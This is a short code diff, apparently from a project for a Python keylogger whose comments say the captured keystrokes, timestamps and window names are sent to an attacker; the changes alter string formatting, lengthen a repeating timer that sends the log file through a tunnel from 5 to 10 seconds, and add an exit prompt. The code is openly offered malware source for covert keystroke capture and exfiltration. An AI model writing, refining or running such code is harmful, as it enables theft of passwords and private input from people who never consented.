@@ -28,7 +28,7 @@ def opensocket():
 
 # Format the log file sent to the attacker
 def onKeyDown(e):
-    s = f"{e.GetKey()} \t {e.Time} \t {e.WindowName} \n"
+    s = "{} \t {} \t {} \n".format(e.GetKey(), e.Time, e.WindowName)
     # c.send(s.encode())
     writeToFile(s)
     return 1
@@ -58,10 +58,11 @@ def start():
 
 
 def send(ot):
-    # wait 5 sec and send the log
-    threading.Timer(interval=5, function=send, args=(ot,)).start()
+    # wait 10 sec and send the log
+    threading.Timer(interval=10, function=send, args=(ot,)).start()
     ot.send_file()
 
 
 # Start tunnel
 start()
+k = input('press enter to exit...')
